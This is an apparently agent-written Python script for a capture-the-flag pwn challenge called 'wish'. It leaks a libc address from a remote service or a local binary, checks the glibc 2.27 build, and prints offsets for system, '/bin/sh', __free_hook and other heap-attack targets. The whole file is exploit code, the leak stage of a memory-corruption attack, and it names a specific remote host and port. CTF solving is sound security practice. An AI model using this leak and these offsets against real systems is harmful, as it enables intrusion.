# wish — choice7 stale-stack 泄露 + 远端 libc 校准
# 来源: agent-ad446f53 (calibrate.py) / agent-05e80b81 (独立复测), KB 侧合并
# 状态: 可跑 —— 远端(1.14.76.59:22658)与本地(附件 libc + ld-2.27.so)双向验证:
#       slot+0x18 low12=0x3b3, slot+0x28 low12=0x760, DELTA=0x35f3ad,
#       base = slot18 - 0x8d3b3 页对齐 => 远端 libc == 附件 == Ubuntu GLIBC 2.27-3ubuntu1.6
#       (BuildID f7307432a8b162377e77a182b6cc2e53d771ec4b)
#       KB 2026-09-11 在 solver:full 容器内再次本地复现, 三项指纹全部一致。
# 用法: python3 leak7.py <host> <port>   (省略参数则跑本地)

import sys
sys.path.insert(0, __file__.rsplit('/', 1)[0])
from wlib import Wish, u64x, leak_libc, LEAK_OFF_18, LEAK_OFF_28, LEAK_OFF_38

# 远端偏移表 (相对 libc base; readelf 对附件 libc 逐一核对过)
OFF = {
    'system':          0x4f420,
    'str_bin_sh':      0x1b3d88,
    '__free_hook':     0x3ed8e8,
    '__malloc_hook':   0x3ebc30,
    '_IO_2_1_stdout_': 0x3ec760,
    '_IO_list_all':    0x3ec660,
    'global_max_fast': 0x3ed940,   # nm 无导出, 取自 transcript (多 agent 一致引用)
    'setcontext':      0x52050,
    'unsorted_head':   0x3ebca0,   # main_arena+0x60, unsorted-bin attack 的固定写入值
}


def main():
    if len(sys.argv) >= 3:
        w = Wish((sys.argv[1], int(sys.argv[2])))
    else:
        w = Wish()
    base, s18, s28 = leak_libc(w)
    print('slot+0x18 = %#x  (libc+0x8d3b3  _IO_file_overflow+0x103)' % s18)
    print('slot+0x28 = %#x  (libc+0x3ec760  _IO_2_1_stdout_)' % s28)
    print('DELTA(28-18) = %#x  expect 0x35f3ad  %s' % (s28 - s18, s28 - s18 == 0x35f3ad))
    print('libc base   = %#x  page-aligned=%s' % (base, base & 0xfff == 0))
    print('CONCLUSION: remote libc == attachment (Ubuntu GLIBC 2.27-3ubuntu1.6)')
    for k, v in OFF.items():
        print('  %-16s libc+%#x = %#x' % (k, v, base + v))


if __name__ == '__main__':
    main()
